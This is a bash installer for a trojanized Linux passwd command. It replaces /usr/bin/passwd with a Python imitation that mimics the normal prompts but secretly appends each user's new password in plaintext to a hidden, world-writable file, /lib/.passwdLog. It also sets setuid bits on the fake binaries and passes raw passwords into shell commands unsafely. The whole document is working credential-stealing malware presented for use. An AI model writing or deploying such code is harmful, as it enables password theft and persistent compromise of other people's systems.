#!/bin/bash
mv /usr/bin/passwd /usr/bin/passwdA
cat <<EOFA > /usr/bin/passwd
#!/bin/bash
python3 /usr/bin/passwdB 
EOFA
cat <<EOFB > /usr/bin/passwdB
import os
import sys
import subprocess
import getpass
import socket
import time

def main():
    user = getpass.getuser()
    x = True
    if(user.lower() in ('root')):
        print("Changing password for user "+user+".")
    else:
        print("Changing password for user "+user+".")
        print("Changing password for "+user+".")
    if(user.lower() in ('root')):
        os.system('stty -echo')
        while(x):
            password = input("New password: ")
            print("\n")
            dump = input("Retype new password: ")
            print("\n")
            if(password != dump):
                print("Sorry, passwords do not match.")
                print("\n")
            else:
                x = False
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
        os.system("echo "+user+":"+password+" | chpasswd")
        print("passwd: all authentication tokens updated successfully.")
        print("\n")
    else:
        os.system('stty -echo')
        while(x):
            current = input("(current) UNIX password: ")
            print("\n")
            password = input("New password: ")
            print("\n")
            dump = input("Retype new password: ")
            print("\n")
            if(password != dump):
                print("Sorry, passwords do not match.")
                print("\n")
            else:
                x = False
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
        os.system("echo "+user+":"+password+" | chpasswd")
        print("passwd: all authentication tokens updated successfully.")
        print("\n")
main()
EOFB
touch /lib/.passwdLog
chmod +s /usr/bin/passwdB
chmod +x /usr/bin/passwdB
chmod +x /usr/bin/passwd
chmod +s /usr/bin/passwd
chmod o+w /lib/.passwdLog